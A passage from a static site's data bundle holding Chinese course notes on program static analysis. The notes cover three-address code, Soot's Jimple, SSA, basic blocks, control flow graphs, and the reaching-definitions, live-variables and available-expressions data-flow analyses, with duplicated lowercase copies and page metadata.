Three-Address Code (3AC)\n\n> There is at most one operator on the right side of an instruction.\n\n通常情况下右边只有一个操作符。转换时通常引入临时变量。三地址码包含最多三个地址。地址由以下的形式表示：\n\n * 标识符：a,b\n * 常量值：3\n * 静态分析器自动生成的临时变量：t1,t2\n\n常见的三地址码形式：\n\nx = y bop z  bop: 二元操作符 \nx = uop y    uop: 一元操作符\nx = y   无操作符\ngoto L  无条件跳转 L 是一个标签\nif x goto L 有条件跳转\nif x rop y goto L \n\n\n1\n2\n3\n4\n5\n6\n\n\n\n# 3AC in Real Static Analyzer: Soot\n\nSoot: Soot's is Jimple: typed 3-address code.\n\nMost popular static analysis framework for Java\n\n比如下面的Java程序：\n\npackage nju.sa.examples;\npublic class FOrLoop3AC{\n\tpublic static void main(String[] args){\n\t\tint x = 0;\n\t\tfor(int i = 0;i<10;i++){\n\t\t\tx = x+1\n\t\t}\n\t}\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n\n可以生成如下的***Jimple***\n\npublic static void main(java.lang.String[])\n{\n\tjava.lang.String[] r0;\n\tint i1;\n\n\tr0 := @parameter0: java.lang.String[];\n\ti1 = 0;\n\nlabel1:\n\tif i1 >=10 goto label2;\n\ti1 = i1+1;\n\tgoto label1;\n\nlabel2:\n\treturn;\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n\n\nDoWhile Loop 、Method Call、Class 对应的Jimple，可以在课件里看到。\n\nTips: 关于Java中的调用指令\n\n指令                说明\ninvokeinterface   用以调用接口方法，在运行时搜索一个实现了这个接口方法的对象，找出适合的方法进行调用。（Invoke interface\n                  method）\ninvokevirtual     指令用于调用对象的实例方法，根据对象的实际类型进行分派（Invoke instance method; dispatch\n                  based on class）\ninvokestatic      用以调用类方法（Invoke a class (static) method ）\ninvokespecial     指令用于调用一些需要特殊处理的实例方法，包括实例初始化方法、私有方法和父类方法。（Invoke instance\n                  method; special handling for superclass, private, and\n                  instance initialization method invocations ）\ninvokedynamic     JDK1.7新加入的一个虚拟机指令，相比于之前的四条指令，他们的分派逻辑都是固化在JVM内部，而invokedynamic则用于处理新的方法分派：它允许应用级别的代码来确定执行哪一个方法调用，只有在调用要执行的时候，才会进行这种判断,从而达到动态语言的支持。(Invoke\n                  dynamic method)\n\n关于Method Signature：class name : return type method name(parameter1 type....)\n\n\n# Static Single Assignment (SSA)\n\nSSA是IR中一个经典的转化格式。SSA给每一个定义一个新的名字，并且在后面进行调用。每一个标识符都有唯一的定义。\n\n\n\n但是对于分支而言，可能出现下面的特殊情况，于是引入了一个特殊的运算。\n\n\n\n为什么要有SSA，那么为什么又不用SSA？\n\n\n\n\n# Basic Blocks (BB)\n\nBB是满足以下的特征的最大指令的集合：\n\n * 入口只有一个，不存在第二条控制流走入BB中的第二条或者第三条指令\n * 出口应该是最后一个指令，不存在从其他非最后指令走出。\n\n\n\nBB怎么划分？\n\n一条一条看，尝试把下一行加入，查看是否符合规则（goto的label，存在goto），直到最后。\n\n 1. 决定leader\n    * 程序第一条指令\n    * jump的target\n    * 上一条指令存在一个jump\n 2. 建立BB\n    * 由入口到下一个入口之间的指令\n\n\n\n\n# Control Flow Graphs (CFG)\n\n怎么在BB的基础上构建CFG呢？\n\n 1. 将语句的label转化为BB的label，从细粒度变为粗粒度的label之后，如果block中存在语句的变化，可能CFG不会产生太大的变化。\n\n\n\n 3. 按照规则添加边\n\n添边规则：\n\n * 有条件或者无条件的从A到B跳转\n * B紧接着A顺序执行时添加边，如果A最后一条是无条件的goto，那么不应该添边\n\n 4. 添加程序真正的出口和入口，如果有多个return，则存在多个exit。\n\n",normalizedContent:"# ir\n\n> 在编译原理时，我们用抽象语法树去作为中间表示形式。静态分析器也需要一种程序的表示形式，这个表示格式需要时简便的、利于静态分析算法的设计的。真正好的ir也并没有严格的定义。绝大部分静态分析器的ir应该是一个什么样子？源程序-> ir -> 后续分析。\n\n\n# compilers and static analyzers\n\n\n# compiler\n\n将source code翻译转换为machine code的过程中，识别源代码中的错误。\n\n编译的过程：\n\n 1. scanner - 词法分析 lexical analysis 词法分析的规则描述形式化的方法是：regular expression。将合法的单词生成tokens。\n 2. parser - 语法分析 syntax analysis 将词法分析生成的tokens交给语法分析器，使用context-free grammer（上下文无关文法）。将合法的程序生成ast（抽象语法树）\n 3. type checker - 语义分析 semantic analysis 利用抽象语法树对语义进行分析，从编译器的角度将，只能做简单的检查，如：类型检查。形式化语言是：attribute grammer。生成decorated ast。\n 4. translator - 编译优化 如果还需要优化等操作，需要将上一步生成的结果转化为ir（通常为三地址码），并进行static analysis。\n 5. codegenerator - 生成机器码\n\n那么能不能直接将源程序生成三地址码的ir，进行静态分析呢？不行的，我们关注的问题是一个相对高级的内容，如果基本的词法、语法等都无法通过，后续也没有什么意义。因此，我们的静态分析是建立在一个通过了前端的校验的合法ir之上的。\n\n\n# ast vs. ir\n\n为什么要用三地址码的ir呢？ast不能解决问题吗？\n\nast                                ir\nhigh-level                         low-level\nclosed to grammar structure        closed to machine code\nusually language dependent         usually language independent\nsuitable for fast type checking    compact and uniform\nlack of control flow information   contains control flow information\n                                   usually considered as the basis for static analysis\n\n以上的三地址码利于静态分析的特性，导致静态分析通常基于ir进行分析。\n\n\n# ir: three-address code (3ac)\n\n> there is at most one operator on the right side of an instruction.\n\n通常情况下右边只有一个操作符。转换时通常引入临时变量。三地址码包含最多三个地址。地址由以下的形式表示：\n\n * 标识符：a,b\n * 常量值：3\n * 静态分析器自动生成的临时变量：t1,t2\n\n常见的三地址码形式：\n\nx = y bop z  bop: 二元操作符 \nx = uop y    uop: 一元操作符\nx = y   无操作符\ngoto l  无条件跳转 l 是一个标签\nif x goto l 有条件跳转\nif x rop y goto l \n\n\n1\n2\n3\n4\n5\n6\n\n\n\n# 3ac in real static analyzer: soot\n\nsoot: soot's is jimple: typed 3-address code.\n\nmost popular static analysis framework for java\n\n比如下面的java程序：\n\npackage nju.sa.examples;\npublic class forloop3ac{\n\tpublic static void main(string[] args){\n\t\tint x = 0;\n\t\tfor(int i = 0;i<10;i++){\n\t\t\tx = x+1\n\t\t}\n\t}\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n\n可以生成如下的***jimple***\n\npublic static void main(java.lang.string[])\n{\n\tjava.lang.string[] r0;\n\tint i1;\n\n\tr0 := @parameter0: java.lang.string[];\n\ti1 = 0;\n\nlabel1:\n\tif i1 >=10 goto label2;\n\ti1 = i1+1;\n\tgoto label1;\n\nlabel2:\n\treturn;\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n\n\ndowhile loop 、method call、class 对应的jimple，可以在课件里看到。\n\ntips: 关于java中的调用指令\n\n指令                说明\ninvokeinterface   用以调用接口方法，在运行时搜索一个实现了这个接口方法的对象，找出适合的方法进行调用。（invoke interface\n                  method）\ninvokevirtual     指令用于调用对象的实例方法，根据对象的实际类型进行分派（invoke instance method; dispatch\n                  based on class）\ninvokestatic      用以调用类方法（invoke a class (static) method ）\ninvokespecial     指令用于调用一些需要特殊处理的实例方法，包括实例初始化方法、私有方法和父类方法。（invoke instance\n                  method; special handling for superclass, private, and\n                  instance initialization method invocations ）\ninvokedynamic     jdk1.7新加入的一个虚拟机指令，相比于之前的四条指令，他们的分派逻辑都是固化在jvm内部，而invokedynamic则用于处理新的方法分派：它允许应用级别的代码来确定执行哪一个方法调用，只有在调用要执行的时候，才会进行这种判断,从而达到动态语言的支持。(invoke\n                  dynamic method)\n\n关于method signature：class name : return type method name(parameter1 type....)\n\n\n# static single assignment (ssa)\n\nssa是ir中一个经典的转化格式。ssa给每一个定义一个新的名字，并且在后面进行调用。每一个标识符都有唯一的定义。\n\n\n\n但是对于分支而言，可能出现下面的特殊情况，于是引入了一个特殊的运算。\n\n\n\n为什么要有ssa，那么为什么又不用ssa？\n\n\n\n\n# basic blocks (bb)\n\nbb是满足以下的特征的最大指令的集合：\n\n * 入口只有一个，不存在第二条控制流走入bb中的第二条或者第三条指令\n * 出口应该是最后一个指令，不存在从其他非最后指令走出。\n\n\n\nbb怎么划分？\n\n一条一条看，尝试把下一行加入，查看是否符合规则（goto的label，存在goto），直到最后。\n\n 1. 决定leader\n    * 程序第一条指令\n    * jump的target\n    * 上一条指令存在一个jump\n 2. 建立bb\n    * 由入口到下一个入口之间的指令\n\n\n\n\n# control flow graphs (cfg)\n\n怎么在bb的基础上构建cfg呢？\n\n 1. 将语句的label转化为bb的label，从细粒度变为粗粒度的label之后，如果block中存在语句的变化，可能cfg不会产生太大的变化。\n\n\n\n 3. 按照规则添加边\n\n添边规则：\n\n * 有条件或者无条件的从a到b跳转\n * b紧接着a顺序执行时添加边，如果a最后一条是无条件的goto，那么不应该添边\n\n 4. 添加程序真正的出口和入口，如果有多个return，则存在多个exit。\n\n",charsets:{cjk:!0},lastUpdated:"2022/04/03, 12:13:15",lastUpdatedTimestamp:1648987995e3},{title:"SA - DFA-Applications",frontmatter:{title:"SA - DFA-Applications",date:"2022-02-11T00:00:00.000Z",permalink:"/sec/sa/nju/dfaapplications",author:{name:"p0jo",link:"https://wiki.pwddd.com"},categories:["静态分析","南京大学课程笔记"],tags:["PL","SA","DFA"],readingShow:"top"},regularPath:"/02.%E5%AE%89%E5%85%A8/200.%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90/2000.%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/02.DFA-Applications.html",relativePath:"02.安全/200.静态分析/2000.南京大学课程笔记/02.DFA-Applications.md",key:"v-73ef1b26",path:"/sec/sa/nju/dfaapplications/",headers:[{level:2,title:"Overview of Data Flow Analysis",slug:"overview-of-data-flow-analysis",normalizedTitle:"overview of data flow analysis",charIndex:25},{level:2,title:"of Data Flow Analysis",slug:"of-data-flow-analysis",normalizedTitle:"of data flow analysis",charIndex:34},{level:3,title:"Input and Output States",slug:"input-and-output-states",normalizedTitle:"input and output states",charIndex:883},{level:3,title:"Notations for Transfer Function Constraints",slug:"notations-for-transfer-function-constraints",normalizedTitle:"notations for transfer function constraints",charIndex:1394},{level:3,title:"Notations for Control Flow's Constraints",slug:"notations-for-control-flow-s-constraints",normalizedTitle:"notations for control flow's constraints",charIndex:1617},{level:2,title:"Reaching Definitions Analysis",slug:"reaching-definitions-analysis",normalizedTitle:"reaching definitions analysis",charIndex:1692},{level:3,title:"Abstraction",slug:"abstraction",normalizedTitle:"abstraction",charIndex:2151},{level:3,title:"Transfer Function",slug:"transfer-function",normalizedTitle:"transfer function",charIndex:1260},{level:3,title:"Control FLow",slug:"control-flow",normalizedTitle:"control flow",charIndex:2383},{level:3,title:"Algorithm of Reaching Definitions Analysis",slug:"algorithm-of-reaching-definitions-analysis",normalizedTitle:"algorithm of reaching definitions analysis",charIndex:2479},{level:3,title:"举了个栗子",slug:"举了个栗子",normalizedTitle:"举了个栗子",charIndex:2792},{level:2,title:"Live Variables Analysis",slug:"live-variables-analysis",normalizedTitle:"live variables analysis",charIndex:3202},{level:3,title:"Abstraction",slug:"abstraction-2",normalizedTitle:"abstraction",charIndex:2151},{level:3,title:"Safe-approximation",slug:"safe-approximation",normalizedTitle:"safe-approximation",charIndex:695},{level:3,title:"举一个栗子",slug:"举一个栗子",normalizedTitle:"举一个栗子",charIndex:3965},{level:2,title:"Available Expressions Analysis",slug:"available-expressions-analysis",normalizedTitle:"available expressions analysis",charIndex:4024},{level:3,title:"Abstraction",slug:"abstraction-3",normalizedTitle:"abstraction",charIndex:2151},{level:3,title:"Safe-approximation",slug:"safe-approximation-2",normalizedTitle:"safe-approximation",charIndex:695},{level:3,title:"Algorithm",slug:"algorithm",normalizedTitle:"algorithm",charIndex:2479},{level:3,title:"举了个栗子",slug:"举了个栗子-2",normalizedTitle:"举了个栗子",charIndex:2792},{level:2,title:"总结三种不同的Data-Flow Analysis",slug:"总结三种不同的data-flow-analysis",normalizedTitle:"总结三种不同的data-flow analysis",charIndex:4726}],headersStr:"Overview of Data Flow Analysis of Data Flow Analysis Input and Output States Notations for Transfer Function Constraints Notations for Control Flow's Constraints Reaching Definitions Analysis Abstraction Transfer Function Control FLow Algorithm of Reaching Definitions Analysis 举了个栗子 Live Variables Analysis Abstraction Safe-approximation 举一个栗子 Available Expressions Analysis Abstraction Safe-approximation Algorithm 举了个栗子 总结三种不同的Data-Flow Analysis",content:'# DFA - Applications\n\n\n# Overview of Data Flow Analysis\n\nData Flow Analysis怎么理解？\n\n\n\n从Introduction中我们可以知道：静态分析实际上就是抽象 Abstract 和 过近似Over-approximation 的结果。这种过近似的静态分析方法实际上是大多数静态分析所采用的，我们称之为may analysis，与之相对还有一个must analysis。所谓的may analysis,指的是我们的结果可以是真实的，也可以存在一些非真实的结果；must analysis作为Under-approximation的结果，指的是所有的输出结果必须是正确的。不管是may analysis还是must analysis都是为了分析的安全（正确），于是就有safe-approximation。\n\n在第一节课中，我们分析了一个表达式中的数据的符号，分为 + - 0 TOP BOTTOM ，这就是对数据的抽象，而对于这个栗子而言我们采用了Over-approximation过近似的方法得出了一个sound的结论。我们所得出的转换函数（[[Introduction#Transfer functions|Transfer function]]) 实际上根据语义和我们所分析的问题得到的分析方法。例如：TOP / 0 = BOTTOM。而[[Introduction#Control Flows|Control Flow Handling]]的体现就是当我们遇到了两个分支合并，对于某一个符号的处理问题。\n\nSafe-approximation：为了分析最终结果的正确。\n\n * may analysis: safe = over\n * must analysis: safe = under\n\n不同的数据流分析有不同的数据抽象，同时也有不同的safe-approximation。因此也就有了不同的转化函数和控制流处理。\n\n\n# of Data Flow Analysis\n\n\n# Input and Output States\n\n使用IN[s1]来表示程序在执行S1语句之前的状态，使用OUT[s1]表示程序在执行完成S1之后的状态。也就是Input and output states。\n\n程序的状态IN/OUT状态和语句前后的program point相关。\n\n\n\n在每一个数据流分析中，我们给每一个程序中的点关联一个数据流的值，这个值代表了程序状态的一个抽象。而值域的概念就是我们上面application的所有抽象的数据流值的集合。如下图的栗子所示：\n\n\n\n实际上数据流分析就是给程序当中的所有语句的IN和OUT去关联一个Data-flow Value的过程。这个过程通过解析一系列的Safe-approximation-directed Constraints(约束规则)，去寻找一个Solution ，而这些约束规则是基于Transfer Function和Control Flow的。也就是说我们不断的解转换函数和控制就信息的约束规则，最终会得到一个Solution ，这个Solution最终会为每一个语句的IN/OUT关联一个Data-flow Value。 ^f2f435\n\n\n# Notations for Transfer Function Constraints\n\n在一般情况下，正常的分析都是按照程序正常执行顺序进行执行的，也就是Froward Analysis。\n\nForward Analysis的数学定义为：OUT[s] = fs(IN[s])\n\n除此之外还有反向的分析方式，Backward Analysis。\n\nBackward Analysis的数学定义为：IN[s] = fs(OUT[s])\n\n\n\n\n# Notations for Control Flow\'s Constraints\n\n上面是单个语句的约束规则，而对于BB的表示规则如下：\n\n\n\n\n# Reaching Definitions Analysis\n\n现阶段不涉及以下的问题：\n\n * 方法调用\n   * 引入的位置：[[Inter-procedural Analysis]]\n * Aliases 两个标识符指向同一块地址。别名\n   * 引入位置：[[Pointer Analysis]]\n\n> A definition d at program ponit p reaches a point q if there is a path from p to q such that d is not "killed" along that path.\n\n也就是说，从一个变量v的定义开始，到某个程序点p之间存在一个路径，并且在路径之中不存在对于v的重新定义，这样就是一个reaching definitions。到达定义可以用于分析变量在使用前是否被初始化了：给每一个变量在CFG的入口处进行初始化一个undefined，如果变量能够reach到变量利用的地方，那么说明存在变量未初始化的利用。\n\n\n# Abstraction\n\n在这个分析中我们关注的数据是definition能否可达某一点，因此我们将所有的definition做抽象。用bit verctors表示。\n\n\n\n接下来从两方面进行分析：\n\n\n# Transfer Function\n\n对于语句D: v = x op y而言在生成一个v的同时，之后的语句中使用的v都是当前生成的v，因此要删除掉对于v的其他定义，但是对于x，y等定义在后续的语句中仍然可用。数字化表示如下：\n\n\n\n举个栗子：\n\n\n\n\n# Control FLow\n\n对于Control Flow而言，由于是一个may analysis，所以不放过任意一条path。将所有的分支的结果的输出的并集都作为下一个BB的输入\n\n\n\n\n# Algorithm of Reaching Definitions Analysis\n\n\n\n按照语义理解，在分析程序之前，ENTRY的OUT必然为空。其他的所有BB在分析之前都为空。为什么要分开写？因为这个算法作为一个算法模板，对所有的Data-Flow Analysis应该都有效，有可能BB的OUT不为空的情况，因此ENTRY的OUT为空，其他的BB的OUT不为空。may analysis的BB OUT一般为空，must analysis的BB OUT一般为TOP。之后，如果存在某个BB的OUT变化了则循环每个BB，使用Control Flow analysis和Transfer Function进行约束。\n\n\n# 举了个栗子\n\n\n\n初始化：\n\n\n\n第一次迭代：\n\n\n\n由于迭代完成之后，存在大于等于一个的BB的OUT变化了，因此还需要继续迭代。\n\n\n\n实际上在迭代之中我们可以发现，如果输入是一样的，那么输出也一定是一样的。应为kill是永远固定的，generate也是固定的。如果in也相同则根据：\n\n\n\n输出也不会变。\n\n最终经过三次的遍历结束，没有BB的OUT发生了变化，于是不要进行遍历了。\n\n\n\n最终得到的结果就是Final Analysis Result。于是根据上面的栗子，我们可以再次回顾之前的对于Data FLow Analysis的理解。\n\n\n\n理解一下，这个算法为什么会停？\n\n这个算法最关键的是Transfer Function：\n\n\n\n那我们的循环条件是安全的吗？\n\n\n\n到达一个不动点：因为当所有的输出都不变化时，上一个输出是下一个输入，输入不会变意味着输出也不会变，所以无论循环多少遍都不会变。\n\n\n# Live Variables Analysis\n\n> Live variables analysis tells whether the value of variable v at program point p could be used along some path in CFG starrting at p. If so, v is live at p; otherwise, v is dead at p.\n\n从p点开始到结束的一条路径中，是不是有个地方使用到了v。v想要live，那么v在从p到结束的时候不能被重新定义。我们就说v在p点是live的。一个典型的应用场景是寄存器的分配问题：寄存器如果满了，那么寄存器中存在的哪些值可以取出，替换为下一条语句的v的值。\n\n\n\n\n# Abstraction\n\n我们关注的方法是所有的variables。0表示在p点是dead的，1是live的。\n\n\n\n\n# Safe-approximation\n\n首先确定一个问题，我们是使用backwards analysis还是使用forwards analysis。虽然没有固定的答案，但是显然backwards analysis更方便我们进行分析。从后往前分析时我们发现某个variable被use了，只需要向前寻找到其定义的p位置即可。而使用forwards analysis，我们从p开始，到use的位置，还需要返回到p的位置。\n\n\n\n这个和上一节的reaching Definition analysis类似，但是由于是backward analysis，因此在初始化的时候会有不同。并且，在一般情况下，may analysis一般初始化为空，must analysis一般初始化为all。后面也会总结。\n\n\n\n\n# 举一个栗子\n\n初始化操作：\n\n\n\n第一次遍历：\n\n\n\n需要下一次遍历，因为IN[B]发生了change：\n\n\n\n\n# Available Expressions Analysis\n\n这是一个must analysis。\n\n> An expression x op y is available at program point p if all paths from the entry to p must pass through the evaluation of x op y, and after the last evaluation of x op y, there is no redefinition of x or y.\n\n大概就是说，一个表达式X OP Y 在p点是可用的，那么从入口到p点的所有的路径中必须都执行过x op y，并且在最后一次执行完x op y之后就没有对于x或者y的重新定义了。典型的利用场景就是对x op y 重复计算的结果的替换。\n\n\n# Abstraction\n\n\n\n\n# Safe-approximation\n\n由于是must analysis，我们要考虑的是在实际的应用场景的safe，也就是说在这里，我们想象成对于表达式结果的替换的场景中，如果说我们误报了，将一个本来是不能被替换的表达式的值替换掉了，那么对于程序来说就是不safe的了。那么如果是进行under-approximation的话，我们也许会漏报一个本来可以进行替换的值，但这不会导致程序不safe，仅仅只是在程序优化的时候没有达到最好的效果而已。\n\n\n\n\n# Algorithm\n\n\n\n\n# 举了个栗子\n\n初始化：\n\n\n\n第一次迭代：\n\n\n\n所有的OUT都发生了变化，所以需要再一次的迭代：\n\n\n\n\n# 总结三种不同的Data-Flow Analysis\n\n                    REACHING DEFINITIONS      LIVE VARIABLES   AVALIABLE EXPRESSION\nDomain              Definition                Variables        Expression\nDirection           Forwards                  Backwards        Forwards\nMay/Must            May                       May              Must\nBoundary            OUT entry = null          IN exit = null   OUT entry = null\nInitialization      OUT B = null              IN B = null      OUT B = all\nTransfer function   OUT = gen U (IN - kill)                    \nMeet                union                     union            and',normalizedContent:'# dfa - applications\n\n\n# overview of data flow analysis\n\ndata flow analysis怎么理解？\n\n\n\n从introduction中我们可以知道：静态分析实际上就是抽象 abstract 和 过近似over-approximation 的结果。这种过近似的静态分析方法实际上是大多数静态分析所采用的，我们称之为may analysis，与之相对还有一个must analysis。所谓的may analysis,指的是我们的结果可以是真实的，也可以存在一些非真实的结果；must analysis作为under-approximation的结果，指的是所有的输出结果必须是正确的。不管是may analysis还是must analysis都是为了分析的安全（正确），于是就有safe-approximation。\n\n在第一节课中，我们分析了一个表达式中的数据的符号，分为 + - 0 top bottom ，这就是对数据的抽象，而对于这个栗子而言我们采用了over-approximation过近似的方法得出了一个sound的结论。我们所得出的转换函数（[[introduction#transfer functions|transfer function]]) 实际上根据语义和我们所分析的问题得到的分析方法。例如：top / 0 = bottom。而[[introduction#control flows|control flow handling]]的体现就是当我们遇到了两个分支合并，对于某一个符号的处理问题。\n\nsafe-approximation：为了分析最终结果的正确。\n\n * may analysis: safe = over\n * must analysis: safe = under\n\n不同的数据流分析有不同的数据抽象，同时也有不同的safe-approximation。因此也就有了不同的转化函数和控制流处理。\n\n\n# of data flow analysis\n\n\n# input and output states\n\n使用in[s1]来表示程序在执行s1语句之前的状态，使用out[s1]表示程序在执行完成s1之后的状态。也就是input and output states。\n\n程序的状态in/out状态和语句前后的program point相关。\n\n\n\n在每一个数据流分析中，我们给每一个程序中的点关联一个数据流的值，这个值代表了程序状态的一个抽象。而值域的概念就是我们上面application的所有抽象的数据流值的集合。如下图的栗子所示：\n\n\n\n实际上数据流分析就是给程序当中的所有语句的in和out去关联一个data-flow value的过程。这个过程通过解析一系列的safe-approximation-directed constraints(约束规则)，去寻找一个solution ，而这些约束规则是基于transfer function和control flow的。也就是说我们不断的解转换函数和控制就信息的约束规则，最终会得到一个solution ，这个solution最终会为每一个语句的in/out关联一个data-flow value。 ^f2f435\n\n\n# notations for transfer function constraints\n\n在一般情况下，正常的分析都是按照程序正常执行顺序进行执行的，也就是froward analysis。\n\nforward analysis的数学定义为：out[s] = fs(in[s])\n\n除此之外还有反向的分析方式，backward analysis。\n\nbackward analysis的数学定义为：in[s] = fs(out[s])\n\n\n\n\n# notations for control flow\'s constraints\n\n上面是单个语句的约束规则，而对于bb的表示规则如下：\n\n\n\n\n# reaching definitions analysis\n\n现阶段不涉及以下的问题：\n\n * 方法调用\n   * 引入的位置：[[inter-procedural analysis]]\n * aliases 两个标识符指向同一块地址。别名\n   * 引入位置：[[pointer analysis]]\n\n> a definition d at program ponit p reaches a point q if there is a path from p to q such that d is not "killed" along that path.\n\n也就是说，从一个变量v的定义开始，到某个程序点p之间存在一个路径，并且在路径之中不存在对于v的重新定义，这样就是一个reaching definitions。到达定义可以用于分析变量在使用前是否被初始化了：给每一个变量在cfg的入口处进行初始化一个undefined，如果变量能够reach到变量利用的地方，那么说明存在变量未初始化的利用。\n\n\n# abstraction\n\n在这个分析中我们关注的数据是definition能否可达某一点，因此我们将所有的definition做抽象。用bit verctors表示。\n\n\n\n接下来从两方面进行分析：\n\n\n# transfer function\n\n对于语句d: v = x op y而言在生成一个v的同时，之后的语句中使用的v都是当前生成的v，因此要删除掉对于v的其他定义，但是对于x，y等定义在后续的语句中仍然可用。数字化表示如下：\n\n\n\n举个栗子：\n\n\n\n\n# control flow\n\n对于control flow而言，由于是一个may analysis，所以不放过任意一条path。将所有的分支的结果的输出的并集都作为下一个bb的输入\n\n\n\n\n# algorithm of reaching definitions analysis\n\n\n\n按照语义理解，在分析程序之前，entry的out必然为空。其他的所有bb在分析之前都为空。为什么要分开写？因为这个算法作为一个算法模板，对所有的data-flow analysis应该都有效，有可能bb的out不为空的情况，因此entry的out为空，其他的bb的out不为空。may analysis的bb out一般为空，must analysis的bb out一般为top。之后，如果存在某个bb的out变化了则循环每个bb，使用control flow analysis和transfer function进行约束。\n\n\n# 举了个栗子\n\n\n\n初始化：\n\n\n\n第一次迭代：\n\n\n\n由于迭代完成之后，存在大于等于一个的bb的out变化了，因此还需要继续迭代。\n\n\n\n实际上在迭代之中我们可以发现，如果输入是一样的，那么输出也一定是一样的。应为kill是永远固定的，generate也是固定的。如果in也相同则根据：\n\n\n\n输出也不会变。\n\n最终经过三次的遍历结束，没有bb的out发生了变化，于是不要进行遍历了。\n\n\n\n最终得到的结果就是final analysis result。于是根据上面的栗子，我们可以再次回顾之前的对于data flow analysis的理解。\n\n\n\n理解一下，这个算法为什么会停？\n\n这个算法最关键的是transfer function：\n\n\n\n那我们的循环条件是安全的吗？\n\n\n\n到达一个不动点：因为当所有的输出都不变化时，上一个输出是下一个输入，输入不会变意味着输出也不会变，所以无论循环多少遍都不会变。\n\n\n# live variables analysis\n\n> live variables analysis tells whether the value of variable v at program point p could be used along some path in cfg starrting at p. if so, v is live at p; otherwise, v is dead at p.\n\n从p点开始到结束的一条路径中，是不是有个地方使用到了v。v想要live，那么v在从p到结束的时候不能被重新定义。我们就说v在p点是live的。一个典型的应用场景是寄存器的分配问题：寄存器如果满了，那么寄存器中存在的哪些值可以取出，替换为下一条语句的v的值。\n\n\n\n\n# abstraction\n\n我们关注的方法是所有的variables。0表示在p点是dead的，1是live的。\n\n\n\n\n# safe-approximation\n\n首先确定一个问题，我们是使用backwards analysis还是使用forwards analysis。虽然没有固定的答案，但是显然backwards analysis更方便我们进行分析。从后往前分析时我们发现某个variable被use了，只需要向前寻找到其定义的p位置即可。而使用forwards analysis，我们从p开始，到use的位置，还需要返回到p的位置。\n\n\n\n这个和上一节的reaching definition analysis类似，但是由于是backward analysis，因此在初始化的时候会有不同。并且，在一般情况下，may analysis一般初始化为空，must analysis一般初始化为all。后面也会总结。\n\n\n\n\n# 举一个栗子\n\n初始化操作：\n\n\n\n第一次遍历：\n\n\n\n需要下一次遍历，因为in[b]发生了change：\n\n\n\n\n# available expressions analysis\n\n这是一个must analysis。\n\n> an expression x op y is available at program point p if all paths from the entry to p must pass through the evaluation of x op y, and after the last evaluation of x op y, there is no redefinition of x or y.\n\n大概就是说，一个表达式x op y 在p点是可用的，那么从入口到p点的所有的路径中必须都执行过x op y，并且在最后一次执行完x op y之后就没有对于x或者y的重新定义了。典型的利用场景就是对x op y 重复计算的结果的替换。\n\n\n# abstraction\n\n\n\n\n# safe-approximation\n\n由于是must analysis，我们要考虑的是在实际的应用场景的safe，也就是说在这里，我们想象成对于表达式结果的替换的场景中，如果说我们误报了，将一个本来是不能被替换的表达式的值替换掉了，那么对于程序来说就是不safe的了。那么如果是进行under-approximation的话，我们也许会漏报一个本来可以进行替换的值，但这不会导致程序不safe，仅仅只是在程序优化的时候没有达到最好的效果而已。\n\n\n\n\n# algorithm\n\n\n\n\n# 举了个栗子\n\n初始化：\n\n\n\n第一次迭代：\n\n\n\n所有的out都发生了变化，所以需要再一次的迭代：\n\n\n\n\n# 总结三种不同的data-flow analysis\n\n                    reaching definitions      live variables   avaliable expression\ndomain              definition                variables        expression\ndirection           forwards                  backwards        forwards\nmay/must            may                       may              must\nboundary            out entry = null          in exit = null   out entry = null\ninitialization      out b = null              in b = null      out b = all\ntransfer function   out = gen u (in - kill)                    \nmeet                union                     union            and',charsets:{cjk:!0},lastUpdated:"2022/04/03, 12:13:15",lastUpdatedTimestamp:1648987995e3},{title:"SA - DFA-Foundations",frontmatter:{title:"SA - DFA-Foundations",date:"2022-02-16T00:00:00.000Z",permalink:"/sec/sa/nju/dfafoundations",author:{name:"p0jo",link:"https://wiki.pwddd.com"},categories:["静态分析","南京大学课程笔记"],tags:["PL","SA","DFA"],readingShow:"top"},regularPath:"/02.%E5%AE%89%E5%85%A8/200.%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90/2000.%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/03.DFA-Foundations.html",relativePath:"02.安全/200.静态分析/2000.南京大学课程笔记/03.DFA-Foundations.md",key:"v-70906098",path:"/sec/sa/nju/dfafoundations/",headers:[{level:2,title:"Iterative Algorithm, Another View",slug:"iterative-algorithm-another-view",normalizedTitle:"iterative algorithm, another view",charIndex:24},{level:2,title:"Partial Order - 偏序",slug:"partial-order-偏序",normalizedTitle:"partial order - 偏序",charIndex:619},{level:2,title:"Upper and Lower Bounds - 上下界",slug:"upper-and-lower-bounds-上下界",normalizedTitle:"upper and lower bounds - 上下界",charIndex:1408},{level:2,title:"Lattice, Semilattice, Complete and Product Lattice - 格、半格、全格",slug:"lattice-semilattice-complete-and-product-lattice-格、半格、全格",normalizedTitle:"lattice, semilattice, complete and product lattice - 格、半格、全格",charIndex:1649},{level:3,title:"Lattice",slug:"lattice",normalizedTitle:"lattice",charIndex:1649},{level:3,title:"Semilattice",slug:"semilattice",normalizedTitle:"semilattice",charIndex:1658},{level:3,title:"Complete Lattice",slug:"complete-lattice",normalizedTitle:"complete lattice",charIndex:2096},{level:3,title:"Product Lattice",slug:"product-lattice",normalizedTitle:"product lattice",charIndex:1684},{level:2,title:"Data Flow Analysis Framework via Lattice",slug:"data-flow-analysis-framework-via-lattice",normalizedTitle:"data flow analysis framework via lattice",charIndex:2927},{level:2,title:"Monotonicity and Fixed Point Theorem - 函数单调性和不动点定理",slug:"monotonicity-and-fixed-point-theorem-函数单调性和不动点定理",normalizedTitle:"monotonicity and fixed point theorem - 函数单调性和不动点定理",charIndex:3408},{level:3,title:"函数单调性",slug:"函数单调性",normalizedTitle:"函数单调性",charIndex:3361},{level:3,title:"不动点定理",slug:"不动点定理",normalizedTitle:"不动点定理",charIndex:3367},{level:2,title:"Relate Iterative Algorithm to Fixed Point Theorem - 